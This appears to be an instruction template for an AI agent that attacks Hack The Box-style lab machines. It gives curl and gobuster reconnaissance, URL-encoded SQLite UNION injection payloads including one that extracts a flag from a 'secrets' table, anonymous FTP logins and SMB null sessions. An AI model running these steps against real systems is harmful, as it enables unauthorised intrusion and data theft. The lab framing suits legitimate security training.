## Procedure
1. Read the Target IP and Topography carefully. Note which ports are actually open.
2. If HTB Questions are provided, tailor the payload to answer them:
   - "how many open ports?" → use nmap to enumerate ports
   - "what is the HTTP title?" → use curl to fetch the root URL and grep for <title>
   - "submit user flag" → exploit the service to read /home/*/user.txt or similar
3. If a Last Failure is provided, read the error carefully and change your approach:
   - Got "404 Not Found"? → the URL path is wrong. Try the root path first to see what's running, or use gobuster to discover valid paths.
   - Got "Connection refused" or "curl: (7)"? → the port is wrong or not open. Check nmap results and try a different port/protocol.
   - Got "Empty output" or timeout? → try a simpler probe first (curl -s -m 10 http://TARGET/).
   - Got a SQL error? → adjust column count or table name.
4. Choose the attack based on OPEN PORTS ONLY:

### STEP 0 — If you have no working HTTP path yet:
- First discover what HTTP paths exist: `gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -q`
- OR probe root: `curl -s -m 10 http://TARGET/`
- Only proceed to SQLi AFTER confirming a valid path exists.

### For HTTP (port 80/443/8080/8000/5000 — ONLY if HTTP port is open):
- Probe root first: `curl -s -m 10 "http://TARGET/"`
- If a path like /search or /login exists, try SQL injection:
  - For SQLite UNION injection — match exact column count of the vulnerable query:
    - Start with 1 column: `curl -s "http://TARGET/PATH?q=%27+UNION+SELECT+1--"`
    - Increase until no error: try 2, 3, 4 columns
  - The internal chimera victim has 4 columns (id, name, description, price) on /search
  - For chimera: `curl -s "http://chimera-victim-1:5000/search?q=%27+UNION+SELECT+1%2Cvalue%2C3%2C4+FROM+secrets+WHERE+key%3D%27flag%27--"`
- For HTTP title: `curl -s -m 10 "http://TARGET/" | grep -i "<title>"`

### For FTP (port 21 — ONLY if FTP port is open):
- Try anonymous login: `curl -s ftp://TARGET --user anonymous:anonymous`
- List files: `curl -s ftp://TARGET/ --user anonymous:anonymous`

### For SSH (port 22):
- Only attempt if credentials were discovered elsewhere

### For SMB (port 445):
- Try null session: `smbclient -L //TARGET -N`

5. Construct a SINGLE bash command targeting the EXACT IP from the context.

## Rules
- ALWAYS use the target IP from the provided context. NEVER use a hardcoded IP.
